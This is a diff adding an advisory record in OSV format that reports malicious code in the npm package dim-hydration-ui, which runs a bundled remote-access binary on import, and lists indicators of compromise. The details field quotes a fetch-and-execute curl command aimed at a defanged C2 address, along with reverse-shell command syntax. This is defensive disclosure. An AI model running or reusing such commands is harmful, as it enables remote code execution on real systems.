@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11604",
+  "modified": "2026-08-24T15:22:39Z",
+  "published": "2026-08-24T15:21:36Z",
+  "summary": "Malicious code in dim-hydration-ui (npm)",
+  "details": "Dim-hydration-ui@1.0.0 masquerades as a calendar/streak math utility but bundles a 63KB Linux ELF (dist/internal/math.bin) that is a remote-access toolkit. Importing the package runs dist/index.mjs, which chmods the binary and spawns it detached in the background. The ELF provides: a port-forwarding mode (/portfwd start \u003clport\u003e \u003crhost\u003e \u003crport\u003e), a reverse-shell / ELF-injection mode (/redshell elf -inject \u003cpid\u003e \u003cfilename\u003e), and a second-stage downloader that fetches and executes a remote ELF from the C2 (curl -s -k -o /tmp/.elf_XXXXXX 'hxxp://217[.]60[.]77[.]63:\u003cport\u003e/Others/\u003cfile\u003e' \u0026\u0026 chmod +x \u0026\u0026 run). It also performs external-IP discovery via api[.]ipify[.]org, fingerprints the host (hostname, uname, network interfaces, user), daemonizes via fork/setsid, and uses TLS (libssl.so.3). C2 IP: 217[.]60[.]77[.]63. Temp paths: /tmp/.sk, /tmp/.cr, /tmp/.elf_XXXXXX.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "dim-hydration-ui",
+        "purl": "pkg:npm/dim-hydration-ui"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/dim-hydration-ui/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11604"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-24T15:21:36Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "217[.]60[.]77[.]63"
+        ],
+        "sha256": [
+          "70815c24f4b213c07babaf69014377b0c76d86697cc34d3f612b377b0fb7ce7f"
+        ],
+        "url_observed": [
+          "hxxp://217[.]60[.]77[.]63",
+          "hxxp://217[.]60[.]77[.]63:80/Others/",
+          "hxxp://api[.]ipify[.]org"
+        ]
+      }
+    }
+  }
+}
